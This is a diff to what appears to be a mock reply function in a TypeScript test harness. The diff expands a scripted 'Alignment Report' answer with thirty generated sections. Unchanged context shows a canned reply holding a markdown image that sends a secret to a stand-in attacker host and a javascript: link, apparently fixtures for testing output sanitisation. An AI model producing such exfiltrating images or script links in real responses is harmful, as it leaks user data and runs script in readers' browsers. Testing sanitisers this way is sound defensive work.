@@ -24,7 +24,8 @@ export function reply(prompt: PromptMessage[]): string {
     return "Summary ![chart](https://attacker.example/leak?q=secret) and [source](javascript:alert(1)) and [ok](https://example.org)";
   }
   if (/Alignment Report/.test(last)) {
-    return "# NGO Strategy and Alignment Report\n\n## Organizational purpose\nScripted purpose." +
+    return "# NGO Strategy and Alignment Report\n\n## Organizational purpose\nScripted purpose.\n\n" +
+      Array.from({ length: 30 }, (_, i) => `## Section ${i + 1}\nInputs $\\rightarrow$ outcomes, line ${i + 1}.`).join("\n\n") +
       marker({ stage: "report", current: 0, covered: [1, 2], lens: "" });
   }
   if (lens) {
